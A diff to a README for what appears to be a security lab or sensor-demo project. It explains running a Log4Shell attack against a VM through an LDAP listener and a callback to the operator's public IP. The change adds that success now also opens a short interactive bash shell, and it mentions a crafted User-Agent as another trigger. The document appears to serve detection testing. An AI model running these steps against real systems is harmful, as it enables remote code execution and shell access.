@@ -60,7 +60,7 @@ python3 tools/ldap-listen.py --port 1389
 ./tools/run-log4shell-ldap.sh --codebase-host YOUR_PUBLIC_IP
 ```
 
-Then open `/security`, set LDAP callback to `YOUR_PUBLIC_IP:1389`, click **Run Log4Shell**. On success the VM gets `/tmp/jss-log4shell-rce` and `/tmp/jss-log4shell-id.txt`.
+Then open `/security`, set LDAP callback to `YOUR_PUBLIC_IP:1389`, click **Run Log4Shell**. On success the VM gets `/tmp/jss-log4shell-rce`, `/tmp/jss-log4shell-id.txt`, and a ~45s interactive `bash` (PTY via `script` when available) for host-sensor demos.
 
 You can also hit search with a crafted `User-Agent`:
 
